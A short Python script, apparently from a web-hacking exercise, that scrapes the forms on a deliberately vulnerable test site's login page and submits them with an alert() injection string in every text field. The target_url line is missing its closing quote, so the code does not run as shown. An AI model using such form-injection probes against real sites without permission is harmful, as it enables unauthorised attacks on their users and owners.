import requests
from bs4 import BeautifulSoup
import urlparse


def request(url):
    try:
        return requests.get(url)

    except requests.exceptions.ConnectionError:
        pass


target_url = "http://testphp.vulnweb.com/login.php
response = requests.get(target_url)
parsed_html = BeautifulSoup(response.content, 'html.parser')
form_list = parsed_html.find_all("form")
post_data = {}

for form in form_list:
    action = form.get("action")
    post_url = urlparse.urljoin(target_url, action)
    method = form.get("method")
    input_list = form.find_all("input")

    for input in input_list:
        input_name = input.get("name")
        input_type = input.get("type")
        input_value = input.get("value")
        if input_type == "text":
            input_value = "alert('Na gap bop duribdi berda')"

        post_data[input_name] = input_value
        print(post_data)
    result = requests.post(post_url, data=post_data)
    print(result)

